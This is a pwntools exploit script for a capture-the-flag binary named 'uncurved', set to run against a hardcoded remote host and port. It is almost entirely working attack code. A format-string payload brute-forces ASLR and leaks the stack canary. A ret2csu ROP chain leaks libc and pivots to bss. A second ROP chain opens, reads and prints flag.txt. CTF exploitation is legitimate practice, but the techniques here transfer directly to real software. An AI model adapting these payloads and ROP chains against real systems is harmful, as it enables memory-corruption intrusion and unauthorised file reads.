#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = ELF('./uncurved')
libc = ELF('./libc.so.6')
r = ROP(exe)

host, port = "193.57.159.27", "46219"

count=0
# we are trying a ret2main, and a leak of canary at the same time
# bruteforce 12bits of ASLR , 1/4096 chance to success.. 
# server answers quick but could take time depending on luck
#
print('ASLR bruteforce starts...')
while (count<10000):
  print(str(count))
  if args.REMOTE:
    p = remote(host,port)
  else:
    p = process(exe.path)

  offset = 1
  p.sendafter('Input 1:\n', 'a'*(offset*8))
  p.sendafter('Input 2:\n', 'a'*(offset*8))

  payload = '%c'*26+'%5758c'+'%hn'+'%c'*27+'%80c'+'%hhn'+'%25$p'
  p.sendafter('Input 3:\n', payload)
  try:
    buff=p.recvuntil('Input 1:\n', timeout=3)
    break
  except:
    p.close()
    count += 1

# get our canary leak
print(buff)
off = buff.find('0x')
canary = int(buff[off:off+18],16)
print('canary = '+hex(canary))

payload = 'A'*0x88+p64(canary)+p64(0xdeadbeef)

# ret2csu gadgets
set_csu = next(exe.search(asm('pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret'), executable = True))
call_csu = next(exe.search(asm('mov rdx, r14; mov rsi, r13; mov edi, r12d')))
def do_ret2csu(edi=0,rsi=0,rdx=0, func=0, rbx=0,rbp=0,r12=0,r13=0,r14=0,r15=0):
   global set_csu
   global call_csu
   return p64(set_csu)+p64(0)+p64(1)+p64(edi)+p64(rsi)+p64(rdx)+p64(func)+p64(call_csu)+p64(0)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)


buff = exe.bss(0xa00)	# a buffer in bss

# 1st ROP payload -->  leak puts libc address & read second ROP payload in bss & pivot to it
r.puts(exe.got['puts'])
r.raw(do_ret2csu(0,buff,0x100,func=exe.got['read']))
r.migrate(buff+24)
p.send(payload+r.chain())

p.sendafter('Input 2:\n', 'a')
p.sendafter('Input 3:\n', 'ab')

# get our libc leak & calculate libc base
p.recvuntil('Rythm.\n', drop=True)
libc.address = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - libc.symbols['puts']
print('libc base = '+hex(libc.address))

# second ROP payload open flag.txt / read it / dump it
if args.REMOTE:
  payload2 = '/srv/app/flag.txt'.ljust(24,'\x00')
else:
  payload2 = './flag.txt'.ljust(24,'\x00')
rop2 = ROP(libc)
syscall = rop2.find_gadget(['syscall', 'ret'])[0]
xchg_eax_edi = libc.address + 0x000000000012a03c # xchg eax, edi ; ret
rop2(rax=2)
rop2.call(syscall,[buff,0,0])
rop2.raw(p64(xchg_eax_edi))
rop2(rsi=0x404100,rdx=0x100)
rop2.call(exe.symbols['read'])
rop2.call(exe.symbols['puts'], [0x404100])
p.send(payload2+rop2.chain())

p.interactive()
